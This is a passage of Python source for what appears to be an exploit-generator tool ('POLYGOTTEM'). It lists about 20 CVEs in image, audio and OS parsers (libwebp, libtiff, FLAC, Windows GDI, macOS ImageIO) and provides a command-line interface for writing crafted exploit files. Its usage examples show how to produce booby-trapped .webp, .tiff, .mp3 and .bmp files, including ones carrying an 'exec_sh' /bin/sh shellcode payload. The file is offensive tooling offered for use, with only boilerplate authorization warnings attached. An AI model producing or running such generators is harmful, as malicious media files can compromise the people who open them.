            'CVE-2024-10573': ('mpg123 <1.32.8 - Frankenstein stream heap overflow', 'critical'),
            'CVE-2023-52356': ('libtiff <4.7.0rc1 - Heap overflow in TIFFReadRGBATileExt', 'critical'),

            # PRIORITY 2
            'CVE-2017-8373': ('libmad 0.15.1b - Heap overflow in mad_layer_III', 'high'),
            'CVE-2006-0006': ('Windows Media Player 7.1/9/10 - BMP heap overflow', 'high'),
            'CVE-2020-22219': ('FLAC <1.4.0 - Buffer overflow in encoder', 'high'),
            'CVE-2020-0499': ('FLAC <1.3.4 - Heap OOB read in decoder', 'high'),
            'CVE-2008-1083': ('Windows GDI - EMF/WMF heap overflow', 'high'),
            'CVE-2005-4560': ('Windows GDI - WMF SETABORTPROC code execution', 'high'),

            # PRIORITY 3
            'CVE-2017-6827': ('audiofile 0.3.6 - MSADPCM heap overflow', 'medium'),
            'CVE-2018-5146': ('libvorbis - OGG Vorbis OOB write in codebook', 'high'),
            'CVE-2022-22675': ('AppleAVD (iOS/macOS) - Video accelerator buffer overflow', 'high'),
            'CVE-2021-0561': ('FLAC <1.3.4 - Encoder OOB write', 'medium'),
            'CVE-2017-11126': ('mpg123 - Global buffer overflow in Layer III', 'medium'),
            'CVE-2021-40426': ('libsox - SPHERE file heap overflow', 'medium'),

            # 2025 macOS OVERFLOWS
            'CVE-2025-43300': ('Apple ImageIO (iOS/iPadOS/macOS) - DNG/TIFF JPEG Lossless OOB write (CRITICAL - ACTIVELY EXPLOITED ZERO-DAY, zero-click RCE via iMessage)', 'critical'),
            'CVE-2025-24228': ('macOS Kernel (Ventura/Sonoma/Sequoia) - Buffer overflow with kernel privileges (CVSS 7.8)', 'high'),
            'CVE-2025-24153': ('macOS SMB - Buffer overflow enabling kernel code execution', 'high'),
            'CVE-2025-24156': ('macOS Xsan - Integer overflow privilege escalation', 'high'),
            'CVE-2025-24154': ('macOS WebContentFilter - Out-of-bounds write kernel memory corruption', 'high'),
        }

        target_info = targets.get(cve_id, ('Unknown target', 'unknown'))
        target_desc, severity = target_info

        print()
        if tui:
            # Show severity-based warning
            if severity == 'critical':
                tui.critical(f"TARGET: {target_desc}")
            elif severity == 'high':
                tui.warning(f"Target: {target_desc}")
            else:
                tui.info(f"Target: {target_desc}")
        else:
            print(f"[*] This exploit targets:")
            print(f"    {target_desc}")

        return output_path


def main():
    parser = argparse.ArgumentParser(
        description='Generate exploit image headers for CVE testing',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Supported CVEs (20 total):

EXISTING (5 CVEs):
  CVE-2015-8540    libpng buffer overflow
  CVE-2019-7317    libpng use-after-free
  CVE-2018-14498   libjpeg heap over-read
  CVE-2019-15133   giflib division by zero
  CVE-2016-3977    giflib heap overflow

PRIORITY 1 (Critical/Recent - 3 CVEs):
  CVE-2023-4863    libwebp heap overflow (CRITICAL - ACTIVELY EXPLOITED!)
  CVE-2024-10573   mpg123 Frankenstein stream heap overflow
  CVE-2023-52356   libtiff heap overflow

PRIORITY 2 (High-Value - 6 CVEs):
  CVE-2017-8373    libmad MP3 heap overflow
  CVE-2006-0006    Windows Media Player BMP heap overflow
  CVE-2020-22219   FLAC encoder buffer overflow
  CVE-2020-0499    FLAC decoder heap OOB read
  CVE-2008-1083    Windows GDI EMF/WMF heap overflow
  CVE-2005-4560    WMF SETABORTPROC code execution

PRIORITY 3 (Audio/Video - 6 CVEs):
  CVE-2017-6827    audiofile WAV MSADPCM heap overflow
  CVE-2018-5146    libvorbis OGG Vorbis OOB write
  CVE-2022-22675   AppleAVD iOS/macOS video accelerator overflow
  CVE-2021-0561    FLAC encoder OOB write
  CVE-2017-11126   mpg123 Layer III global buffer overflow
  CVE-2021-40426   libsox SPHERE file heap overflow

Payload Types:
  poc_marker       Safe PoC marker (default)
  nop_sled         NOP sled for testing
  exec_sh          Execute /bin/sh (x64 Linux)

Examples:
  # Generate CRITICAL WebP exploit (actively exploited in wild!)
  %(prog)s CVE-2023-4863 exploit.webp

  # Generate recent MP3 exploit
  %(prog)s CVE-2024-10573 exploit.mp3 -p nop_sled

  # Generate TIFF exploit with shellcode (DANGEROUS!)
  %(prog)s CVE-2023-52356 exploit.tiff -p exec_sh

  # Generate legacy Windows BMP exploit
  %(prog)s CVE-2006-0006 exploit.bmp

  # Generate FLAC audio exploit
  %(prog)s CVE-2020-22219 exploit.flac

  # Generate OGG Vorbis exploit
  %(prog)s CVE-2018-5146 exploit.ogg

WARNING: Only test on systems you own or have authorization to test!
These exploits can crash applications or execute arbitrary code!
Educational and research purposes ONLY!
        """
    )

    parser.add_argument('cve', nargs='?', help='CVE identifier (e.g., CVE-2015-8540)')
    parser.add_argument('output', nargs='?', help='Output file path')
    parser.add_argument('-p', '--payload', default='poc_marker',
                       choices=['poc_marker', 'nop_sled', 'exec_sh'],
                       help='Shellcode payload type')
    parser.add_argument('--no-color', action='store_true',
                       help='Disable colored output')
    parser.add_argument('--no-accel', action='store_true',
                       help='Disable Intel NPU/GPU hardware acceleration')
    parser.add_argument('--benchmark', action='store_true',
                       help='Run hardware acceleration benchmark')

    args = parser.parse_args()

    # Handle benchmark mode
    if args.benchmark:
        if ACCEL_AVAILABLE:
            accel = get_accelerator(verbose=True)
            print()
            accel.print_benchmark_results(size_mb=10.0)
            print()
        else:
            if TUI:
                t = TUI()
                t.error("Hardware acceleration not available (missing dependencies)")
            else:
                print("[!] Hardware acceleration not available")
        return 0

    # Validate required arguments
    if not args.cve or not args.output:
        parser.print_help()
        return 1

    # Initialize TUI
    tui = None
    if TUI is not None and not args.no_color:
        tui = TUI()
        tui.banner("POLYGOTTEM CVE Exploit Generator", "20 CVEs Supported | Intel Acceleration Ready")
    else:
        print("\n=== POLYGOTTEM CVE Exploit Generator ===\n")

    # Initialize generator with acceleration
    generator = ExploitHeaderGenerator(use_acceleration=not args.no_accel)

    # Show acceleration status
    if generator.accelerator and not args.no_color:
        stats = generator.accelerator.get_acceleration_stats()
        if stats['acceleration_enabled'] and tui:
            print()
            if stats['npu_available']:
                tui.success(f"Intel NPU acceleration: ENABLED ({stats['device_name']})")
            if stats['gpu_available']:
                tui.success(f"Intel Arc GPU acceleration: ENABLED ({stats['device_name']})")
            print()

    try:
        generator.generate_exploit(args.cve, args.output, args.payload, tui=tui)

        # Final warnings
        print()
        if tui:
            tui.box("⚠ SECURITY WARNING", [
                "This file contains a CVE exploit payload!",
                "",
                "Only use for authorized security testing!",
                "Can crash applications or execute code!",
                "Educational and research purposes ONLY!"
            ])
        else:
            print("[!] WARNING: This file contains exploit payload!")
            print("    Only use for authorized security testing!")

        print()
        return 0
    except ValueError as e:
        if tui:
            tui.error(str(e))
        else:
            print(f"[!] Error: {e}", file=sys.stderr)
        return 1
    except Exception as e:
        if tui:
            tui.error(f"Failed to generate exploit: {e}")
        else:
            print(f"[!] Error: {e}", file=sys.stderr)
        import traceback
        traceback.print_exc()
        return 1


if __name__ == '__main__':
    sys.exit(main())
